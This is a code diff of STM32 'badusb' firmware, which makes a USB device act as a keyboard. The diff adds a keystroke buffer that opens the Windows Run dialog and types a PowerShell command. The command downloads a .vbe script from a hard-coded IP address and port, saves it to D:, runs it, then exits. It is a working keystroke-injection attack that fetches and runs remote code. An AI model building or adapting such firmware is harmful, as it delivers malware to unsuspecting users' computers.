@@ -14,6 +14,7 @@
 *******************************************************************************/
 
 /* Includes ------------------------------------------------------------------*/
+#include <string.h>
 #include "stm32f10x_lib.h"
 #include "usb_lib.h"
 #include "hw_config.h"
@@ -22,6 +23,20 @@ typedef          int   int32_t;
 typedef unsigned int   uint32_t;
 typedef unsigned char  uint8_t;
 typedef unsigned short uint16_t;
+
+char *key_buffer[4] = {
+	"p1wershell (New-Object \"System.Net.WebClient\").DownloadFile('http://123.56.12.242:8421/test.vbe', 'D:\\test.vbe')\n\0\0\0\0\0\0\0\0\0\0\0\0",
+	"D:\\test.vbe\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
+	"exit\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
+	"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
+};
+
+u8 Buffer_Shift[8]   = {0x2, 0, 0, 0, 0, 0, 0, 0}; //Keyboard Shift
+u8 Buffer_Win[8]     = {0x8, 0, 0, 0, 0, 0, 0, 0}; //Keyboard Win
+u8 Buffer_Win_R[8]   = {0x8, 0, 0x15, 0, 0, 0, 0, 0}; //Keyboard R
+u8 buffer_release[8] = {0, 0, 0, 0, 0, 0, 0, 0};
+	 
+char sys_banner[] = {"badusb system buildtime [" __TIME__ " " __DATE__ "] "};
 
 void Delay(vu32 nCount);
 /* ############################ gpio driver start ############################# */
@@ -287,7 +302,6 @@ void delay(uint32_t t)
 			__asm { nop };
 		}
 	}
-	
 }
 
 /* gpio functions */
@@ -301,19 +315,6 @@ void __keyboard_send(u8 *Buffer)
 		SetEPTxValid(ENDP1);
 		Delay(1000000);
 }
-
-u8 Buffer_Shift[8]   = {0x2, 0, 0, 0, 0, 0, 0, 0}; //Keyboard Shift
-u8 Buffer_Win[8]     = {0x8, 0, 0, 0, 0, 0, 0, 0}; //Keyboard Win
-u8 Buffer_Win_R[8]   = {0x8, 0, 0x15, 0, 0, 0, 0, 0}; //Keyboard R
-u8 buffer_release[8] = {0, 0, 0, 0, 0, 0, 0, 0};
-
-#if 0
-u8 buffer_c[8] = {0, 0, 0x06, 0, 0, 0, 0, 0}; //Keyboard c
-u8 buffer_m[8] = {0, 0, 0x10, 0, 0, 0, 0, 0}; //Keyboard m
-u8 buffer_d[8] = {0, 0, 0x07, 0, 0, 0, 0, 0}; //Keyboard d
-
-u8 buffer_enter[8] = {0, 0, 0x28, 0, 0, 0, 0, 0}; //Keyboard d
-#endif
 
 int keyboard_send_ascii(u8 c)
 {
@@ -421,22 +422,11 @@ void __local_irq_enable(void)
 	__asm { cpsie i };
 }
 
-char sys_banner[] = {"badusb system buildtime [" __TIME__ " " __DATE__ "] "};
-
-extern unsigned char  Load$$ER_IROM1$$Base;
-extern unsigned char Image$$ER_IROM1$$Base;
-extern unsigned char Image$$ER_IROM1$$Length;
-
-extern unsigned char  Load$$RW_IRAM1$$Base;
-extern unsigned char Image$$RW_IRAM1$$Base;
-extern unsigned char Image$$RW_IRAM1$$Length;
-
-uint32_t flash_load_base, flash_image_base, flash_image_size;
-uint32_t ram_load_base, ram_image_base, ram_image_size;
-
 #define DUMP_VAR4(var)          printf(#var":\t 0x%08x\n", var)
 int main(void)
 {
+	uint32_t i;
+
 #ifdef DEBUG
   debug();
 #endif
@@ -457,7 +447,7 @@ int main(void)
 	DUMP_VAR4(ram_image_size);
 #endif
 	__local_irq_disable();
-	*((volatile int *)(0xe000ed08)) = 0x0800e000;
+	*((volatile int *)(0xe000ed08)) = 0x0800e000;	/* set the VTOR */
 	__local_irq_enable();
 	
   Set_System();
@@ -471,8 +461,6 @@ int main(void)
 	printf("%s\n", sys_banner);
 	printf("");
 #endif
-	//while(1);
-
 
   Set_USBClock();
 
@@ -500,10 +488,16 @@ int main(void)
 		__keyboard_send(buffer_release);
 		/****************************************************/
 		
+		for(i = 0; i < 4; i++) {
+			if (strlen(key_buffer[i]) != 0) {
+				keyboard_send_string(key_buffer[i]);
+			}
+		}
+#if 0
 		keyboard_send_string("powershell (New-Object \"System.Net.WebClient\").DownloadFile('http://123.56.12.242:8421/test.vbe', 'D:\\test.vbe')\n");
 		keyboard_send_string("D:\\test.vbe\n");
 		keyboard_send_string("exit\n");
-		
+#endif
 		break;
   }
 
